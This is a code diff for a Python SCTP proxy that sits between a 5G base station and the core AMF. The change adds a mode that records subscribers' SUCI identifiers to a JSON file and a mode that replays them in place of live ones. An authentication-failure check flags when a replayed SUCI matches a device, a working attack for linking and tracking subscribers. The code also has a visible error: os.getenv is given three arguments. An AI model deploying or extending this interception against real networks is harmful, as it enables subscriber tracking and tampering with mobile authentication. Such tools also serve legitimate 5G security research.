@@ -1,19 +1,28 @@
 import os
 import socket
-import struct
 import threading
 import sctp
 from pycrate_asn1dir.NGAP import NGAP_PDU_Descriptions
 from pycrate_mobile.NAS5G import parse_NAS5G
 from copy import deepcopy
+import argparse
+import json
+from pathlib import Path
+from threading import Lock
 
 
 # Config 
 _NGAP_PDU_PROTO = NGAP_PDU_Descriptions.NGAP_PDU
 
-AMF_IP      = os.getenv("AMF_IP")
-AMF_PORT    = int(os.getenv("AMF_PORT"))
-LISTEN_PORT = int(os.getenv("LISTEN_PORT"))
+AMF_IP      = os.getenv("AMF_IP","0.0.0.0","127.0.0.1")
+AMF_PORT    = int(os.getenv("AMF_PORT","38412"))
+LISTEN_PORT = int(os.getenv("LISTEN_PORT","38412"))
+
+# JSON Config
+RECORD_MODE = False
+JSON_FILE = Path("collected.json")
+_json_lock = Lock()
+
 
 # NAS message types
 NAS_AUTH_RESPONSE = 0x57
@@ -26,11 +35,10 @@ PROC_UPLINK_NAS = 46
 # PPID for AMF, else failure
 NAS_PPID = 60
 
-# ATTACK SCENARIO - Recorded using the prints in replace_suci()
+# ATTACK SCENARIO - Default testing one
 FAKE_SUCI = {
     "SupiFormat":         0,
-    "MCC":                "208",
-    "MNC":                "95",
+    "PLMN":                "20895",
     "RoutingIndicator":   "0210",
     "ProtectionSchemeId": 1,
     "HomeNetworkPKI":     1,
@@ -40,9 +48,78 @@ FAKE_SUCI = {
     "MAC": bytes.fromhex("efe3f139dd309fd1")
 }
 
+# JSON helpers
+
+def append_suci(suci: dict) -> None:
+    """Append a SUCI in a recorded JSON list"""
+    try:
+        with _json_lock:
+            if JSON_FILE.exists():
+                try:
+                    with open(JSON_FILE, "r") as f:
+                        data = json.load(f)
+                        if not isinstance(data, list):
+                            data = []
+                except json.JSONDecodeError:
+                    data = []
+            else:
+                data = []
+
+            data.append(suci)
+
+            with open(JSON_FILE, "w") as f:
+                json.dump(data, f, indent=2)
+
+    except Exception as e:
+        print(f"ERROR - append_suci failed: {e}")
+
+
+def decode_suci_record(record: dict) -> dict:
+    """Convert JSON record"""
+    return {
+        "PLMN": record["PLMN"],
+        "RoutingIndicator": record["RoutingIndicator"],
+        "ProtectionSchemeId": record["ProtectionSchemeId"],
+        "HomeNetworkPKI": record["HomeNetworkPKI"],
+        "ECCEphemPK": bytes.fromhex(record["ECCEphemPK"]),
+        "CipherText": bytes.fromhex(record["CipherText"]),
+        "MAC": bytes.fromhex(record["MAC"]),
+    }
+
+
+def get_suci(index: int) -> dict | None:
+    """Retrieve the SUCI."""
+    try:
+        if not JSON_FILE.exists():
+            print("No collected.json file found")
+            return None
+
+        with _json_lock:
+            with open(JSON_FILE, "r") as f:
+                data = json.load(f)
+
+        if not isinstance(data, list):
+            print("Invalid JSON format (not a list)")
+            return None
+
+        if index < 0 or index >= len(data):
+            print(f"Index {index} out of range (size={len(data)})")
+            return None
+
+        suci = data[index]
+
+        if suci:
+            return decode_suci_record(suci)
+
+    except Exception as e:
+        print(f"ERROR - get_suci failed: {e}")
+        return None
+
+
+
+
 
 # NGAP helpers
-
 def NGAP_PDU():
     return deepcopy(_NGAP_PDU_PROTO)
 
@@ -120,12 +197,19 @@ def replace_suci(nas_bytes: bytes) -> bytes | None:
         except Exception:
             pass
         
+
+        FAKE_SUCI = get_suci(0)
+
+        if FAKE_SUCI is None:
+            print("ERROR - no SUCI available, forwarding original")
+            return None
+
         fgsid_ie = msg["5GSID"]
         fgsid = fgsid_ie["5GSID"]
         suci = fgsid["Value"]
 
         # Replace non encryptet SUCI values
-        suci["PLMN"].encode(FAKE_SUCI["MCC"] + FAKE_SUCI["MNC"])
+        suci["PLMN"].encode(FAKE_SUCI["PLMN"])
         suci["RoutingInd"].encode(FAKE_SUCI["RoutingIndicator"])
         suci["ProtSchemeID"].set_val(FAKE_SUCI["ProtectionSchemeId"])
         suci["HNPKID"].set_val(FAKE_SUCI["HomeNetworkPKI"])
@@ -153,6 +237,51 @@ def replace_suci(nas_bytes: bytes) -> bytes | None:
         print(f"ERROR - replace_suci failed: {e}")
         return None
 
+def record_suci(nas_bytes: bytes) -> None:
+    try:
+        msg, err = parse_NAS5G(nas_bytes)
+        if err:
+            print(f"ERROR - NAS parse error: {err}")
+            return None
+        
+        try:
+            # print(msg.show())
+            original = msg["5GSID"].get_val()
+            print(f"Original mobile identity: {original}")
+        except Exception:
+            pass
+        
+        fgsid_ie = msg["5GSID"]
+        fgsid = fgsid_ie["5GSID"]
+        suci = fgsid["Value"]
+
+        # Extract cleartext fields
+        record = {
+            "PLMN": suci["PLMN"].decode() if hasattr(suci["PLMN"], "decode") else str(suci["PLMN"]),
+            "RoutingIndicator": suci["RoutingInd"].decode() if hasattr(suci["RoutingInd"], "decode") else str(suci["RoutingInd"]),
+            "ProtectionSchemeId": suci["ProtSchemeID"].get_val(),
+            "HomeNetworkPKI": suci["HNPKID"].get_val(),
+        }
+
+        # Extract encrypted output
+        out = suci["Output"].get_alt()
+
+        record.update({
+            "ECCEphemPK": out["ECCEphemPK"].get_val().hex(),
+            "CipherText": out["CipherText"].get_val().hex(),
+            "MAC": out["MAC"].get_val().hex()
+        })
+
+        print(f"Recording SUCI: {record}")
+
+        append_suci(record)
+
+
+    except Exception as e:
+        print(f"ERROR - record_suci failed: {e}")
+        return None
+
+
 
 # Proxy threads 
 def uplink(gnb_sock, amf_sock):
@@ -178,6 +307,13 @@ def uplink(gnb_sock, amf_sock):
                 # Retreive NAS and replace it before forwarding
                 nas = get_nas_pdu(pdu)
                 if nas:
+                    
+                    # Records SUCI instead of changing the value
+                    if RECORD_MODE:
+                        record_suci(nas)
+                        amf_sock.sctp_send(data, ppid=NAS_PPID)
+                        continue
+
                     patched_nas = replace_suci(nas)
                     if patched_nas:
                         rebuilt = set_nas_pdu(pdu, patched_nas)
@@ -206,7 +342,6 @@ def uplink(gnb_sock, amf_sock):
 
                     elif msg_type == NAS_AUTH_FAILURE:
                         print(f"Authentication Failure — RAN-UE-NGAP-ID: {ran_ue_id} - SUCI TO UE FOUND!!!")
-           
 
             amf_sock.sctp_send(data, ppid=NAS_PPID)
 
@@ -246,10 +381,22 @@ def handle(gnb_sctp):
     t2.join()
 
 def main():
+    parser = argparse.ArgumentParser()
+    parser.add_argument("--save", action="store_true", help="Record SUCIs instead of replacing")
+    args = parser.parse_args()
+    
+    global RECORD_MODE
+    RECORD_MODE = args.save
+
+    
     print(f"SUCI proxy starting")
     print(f"Listening on 0.0.0.0:{LISTEN_PORT}")
     print(f"Forwarding to AMF {AMF_IP}:{AMF_PORT}")
-    print(f"Will replace any SUCI with: {FAKE_SUCI}")
+    
+    if RECORD_MODE:
+        print("Mode: RECORD (SUCI will be saved to collected.json)")
+    else:
+        print(f"Mode: REPLACE SUCI with a recorded one")
 
     server = sctp.sctpsocket_tcp(socket.AF_INET)
     server.bind(("0.0.0.0", LISTEN_PORT))
